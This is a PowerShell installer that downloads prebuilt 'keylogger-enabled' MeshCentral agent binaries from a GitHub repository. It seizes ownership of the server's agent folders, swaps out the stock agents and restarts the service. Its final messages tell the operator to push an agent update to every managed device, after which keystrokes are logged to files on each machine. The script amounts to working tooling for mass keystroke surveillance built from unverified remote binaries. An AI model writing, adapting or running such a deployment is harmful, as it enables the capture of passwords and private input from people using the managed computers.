param(
    [string]$MeshCentralRoot = 'C:\Program Files\Open Source\MeshCentral',
    [string]$ServiceName = 'meshcentral.exe'
)

$ErrorActionPreference = 'Stop'

$data = Join-Path $MeshCentralRoot 'meshcentral-data'
# MeshCentral serves agents with this priority:
#   1. meshcentral-data\agents\          <- custom agents live here (also the signing source)
#   2. meshcentral-data\signedagents\    <- regenerated from #1 at server start
#   3. node_modules\meshcentral\agents\  <- stock package agents
$dataAgents = Join-Path $data 'agents'
$signed = Join-Path $data 'signedagents'

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = [Security.Principal.WindowsPrincipal]::new($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'Open PowerShell with Run as administrator, then run this installer again.'
}
if (-not (Test-Path -LiteralPath $data)) { throw "MeshCentral data folder not found: $data" }

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$work = Join-Path ([IO.Path]::GetTempPath()) ('mckeylog-agent-' + $stamp)
$archive = Join-Path $work 'meshcentral-keylogger.zip'
$sourceRoot = Join-Path $work 'meshcentral-keylogger-main'
$backup = Join-Path (Join-Path $data 'mckeylog-agent-backups') $stamp
$serviceWasRunning = $false
New-Item -ItemType Directory -Force -Path $work, $backup, $dataAgents, $signed | Out-Null

function Grant-FullControl([string]$dir) {
    # MeshCentral runs as SYSTEM, so folders and files it created can end up
    # with ACLs that block even an elevated administrator. Take ownership and
    # grant the current administrator full control before replacing anything.
    takeown /F "$dir\*" /A /DY 2>$null | Out-Null
    & icacls.exe "$dir\*" /grant "$($identity.Name):(F)" /C 2>$null | Out-Null
}

try {
    Write-Output 'Downloading the current MeshCentral Keylogger project from GitHub...'
    Invoke-WebRequest -Uri 'https://github.com/og-debug447/meshcentral-keylogger/archive/refs/heads/main.zip' -OutFile $archive
    Expand-Archive -LiteralPath $archive -DestinationPath $work -Force

    $binaries = @(
        @{ Source = (Join-Path $sourceRoot 'binaries\MeshService.exe'); Name = 'MeshService.exe' },
        @{ Source = (Join-Path $sourceRoot 'binaries\MeshService64.exe'); Name = 'MeshService64.exe' }
    )
    foreach ($binary in $binaries) {
        if (-not (Test-Path -LiteralPath $binary.Source)) { throw "Keylogger binary not found in the project: $($binary.Source)" }
    }

    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($null -ne $service -and $service.Status -ne 'Stopped') {
        Write-Output "Stopping $ServiceName while the agent cache is updated..."
        Stop-Service -Name $ServiceName -Force
        (Get-Service -Name $ServiceName).WaitForStatus('Stopped', [TimeSpan]::FromSeconds(45))
        $serviceWasRunning = $true
    }

    Grant-FullControl $dataAgents
    Grant-FullControl $signed

    # Back up whatever is there now (both locations), then publish the
    # keylogger agent. ARM64 and any other user-placed agents are left alone.
    foreach ($dir in @($dataAgents, $signed)) {
        $existing = Get-ChildItem -LiteralPath $dir -Filter 'MeshService*.exe' -ErrorAction SilentlyContinue
        foreach ($file in $existing) {
            Copy-Item -LiteralPath $file.FullName -Destination (Join-Path $backup $file.Name)
        }
    }
    foreach ($binary in $binaries) {
        Copy-Item -LiteralPath $binary.Source -Destination (Join-Path $dataAgents $binary.Name) -Force
        Copy-Item -LiteralPath $binary.Source -Destination (Join-Path $signed $binary.Name) -Force
        Write-Output "Published $(Join-Path $dataAgents $binary.Name)"
    }

    if ($null -ne $service) {
        Write-Output "Starting $ServiceName..."
        Start-Service -Name $ServiceName
        (Get-Service -Name $ServiceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(45))
    }

    # Confirm the published files survived the restart (the server re-signs
    # the signed-agent cache from meshcentral-data\agents\ on startup).
    foreach ($binary in $binaries) {
        $published = Join-Path $dataAgents $binary.Name
        $want = (Get-FileHash -LiteralPath $binary.Source -Algorithm SHA256).Hash
        $got = (Get-FileHash -LiteralPath $published -Algorithm SHA256).Hash
        if ($want -ne $got) { throw "Published agent $binary.Name no longer matches the project binary" }
    }
    Write-Output 'Keylogger-enabled agent binaries published.'
    Write-Output 'Next, on each managed device: PC Control -> agent menu -> "Agent Update" (or reinstall the agent from the console).'
    Write-Output 'The agent logs keystrokes to keylog-YYYY-MM-DD.log next to its own executable (10 MB rolling files).'
    Write-Output "Backup: $backup"
} catch {
    Write-Output "Installation failed. The previous agents are backed up at $backup"
    if ($serviceWasRunning) {
        try {
            $currentService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
            if ($null -ne $currentService -and $currentService.Status -eq 'Stopped') {
                Start-Service -Name $ServiceName
                (Get-Service -Name $ServiceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(45))
            }
        } catch { Write-Output "MeshCentral service recovery failed: $($_.Exception.Message)" }
    }
    throw
}
